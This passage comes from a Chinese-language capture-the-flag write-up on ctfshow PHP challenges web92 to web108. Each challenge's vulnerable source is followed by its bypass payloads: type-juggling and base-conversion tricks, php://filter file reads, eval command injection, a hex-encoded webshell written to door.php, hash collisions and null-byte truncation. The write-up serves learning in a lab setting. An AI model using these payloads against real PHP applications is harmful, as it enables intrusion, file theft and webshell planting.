class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-4">payload</h3>
<h4 id="方法一-2">方法一</h4>
<p>小数直接绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=4476.1</span><br></pre></td></tr></table></figure>
<h4 id="方法二-2">方法二</h4>
<p>使用进制绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=010574</span><br><span class="line">?num=0x117c</span><br></pre></td></tr></table></figure>
<p>原理和方法与web90相似</p>
<h2 id="web93">web93</h2>
<h3 id="源码-5">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-5">payload</h3>
<p>增加了对字母的过滤</p>
<h4 id="方法一-3">方法一</h4>
<p>小数直接绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=4476.1</span><br></pre></td></tr></table></figure>
<h4 id="方法二-3">方法二</h4>
<p>使用进制绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=010574</span><br></pre></td></tr></table></figure>
<h2 id="web94">web94</h2>
<h3 id="源码-6">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-6">payload</h3>
<p>开头不能出现0，但需要存在0</p>
<h4 id="方法一-4">方法一</h4>
<p>使用换行符%0a</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=4476%0a0</span><br></pre></td></tr></table></figure>
<h4 id="方法二-4">方法二</h4>
<p>在十六进制的基础上加一个空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=%20010574</span><br></pre></td></tr></table></figure>
<h2 id="web95">web95</h2>
<h3 id="源码-7">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-7">payload</h3>
<p>加入了.的过滤，无法使用小数了</p>
<h4 id="方法一-5">方法一</h4>
<p>使用换行符%0a</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=4476%0a0</span><br></pre></td></tr></table></figure>
<h4 id="方法二-5">方法二</h4>
<p>在十六进制的基础上加一个空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=%20010574</span><br></pre></td></tr></table></figure>
<h2 id="web96">web96</h2>
<h3 id="源码-8">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-8">payload</h3>
<h4 id="方法一-6">方法一</h4>
<p>读取当前目录下的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?u=./flag.php</span><br></pre></td></tr></table></figure>
<h4 id="方法二-6">方法二</h4>
<p>通过伪协议进行读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?u=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<h2 id="web97">web97</h2>
<h3 id="源码-9">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="payload-9">payload</h3>
<p>强类型绕过</p>
<p>使用数组绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#POST</span><br><span class="line">a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure>
<h2 id="web98">web98</h2>
<h3 id="源码-10">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="payload-10">payload</h3>
<p>看逻辑传就行了</p>
<h2 id="web99">web99</h2>
<h3 id="源码-11">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="payload-11">payload</h3>
<p>通过写入一句话木马名字为数字.php，然后连接即可</p>
<h2 id="web100">web100</h2>
<h3 id="源码-12">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="payload-12">payload</h3>
<p>少了一些过滤，可以直接命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=system(&quot;cp+ctfshow.php+1.txt&quot;)?&gt;&amp;v3=;</span><br></pre></td></tr></table></figure>
<h2 id="web101">web101</h2>
<h3 id="源码-13">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="payload-13">payload</h3>
<p>因为将大部分的字符都进行了过滤，所以通过类反射的方法进行读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure>
<h2 id="web102">web102</h2>
<h3 id="源码-14">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="payload-14">payload</h3>
<p>首先看一下两个函数，</p>
<p>call_user_func() ，第一个参数是调用的对象，第二个参数是被调用对象的参数</p>
<p>file_put_contents() 来进行写文件的操作，第一个参数是文件名，第二个参数是写进去的内容</p>
<p>v3是指定写进去的文件，这边使用伪协议利用base编码写进去</p>
<p>v2是木马文件先转base，再转十六进制，又通过v1的hex2bin还原达成利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v1=hex2bin v2=005044383959474e6864434171594473 v3=php://filter/write=convert.base64-decode/resource=door.php</span><br></pre></td></tr></table></figure>
<h2 id="web103">web103</h2>
<h3 id="源码-15">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*p.*h.*p.*/i&quot;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="payload-15">payload</h3>
<p>其实和上一题区别不大，就不详细看了，就是过滤了php三个字母，简单绕过罢了</p>
<h2 id="web104">web104</h2>
<h3 id="源码-16">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="payload-16">payload</h3>
<p>甚至没有要求不相等，随便交两个值都能过</p>
<h2 id="web105">web105</h2>
<h3 id="源码-17">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="payload-17">payload</h3>
<p>哈希碰撞，类似的字符串自行搜集即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaO8zKZF   aaK1STfY</span><br></pre></td></tr></table></figure>
<h2 id="web106">web106</h2>
<p>同105</p>
<h2 id="web107">web107</h2>
<h3 id="源码-18">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       <span class="title function_ invoke__">parse_str</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="payload-18">payload</h3>
<p>可以使用布尔相等去进行绕过</p>
<p>如果v3传输进去一个数组则会 出现NULL，此时v2传入一个任意值，不相等则满足NULL，成功绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#POST</span><br><span class="line">v1=1</span><br><span class="line">?v3[]=0</span><br></pre></td></tr></table></figure>
<h2 id="web108">web108</h2>
<h3 id="源码-19">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="payload-19">payload</h3>
<p>本题关键点，首先先看ereg函数，在字符串搜索，绕过匹配成功则返回，strrev是一个倒序函数，intval就是一个转换</p>
<p>ereg函数存在NULL截断漏洞，用%00截断可以绕过第一个if，然后开始逆推，所需要值是0x36d，转为十进制为877，再倒序就是778</p>
<p>又由于第一个函数需要存在字母，所以最终的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=abc%00778</span><br><span class="line">#字母+%00+778</span><br></pre></td></tr></table></figure>
<h2 id="web109">web109</h2>
<h3 id="源码-20">源码</h3>
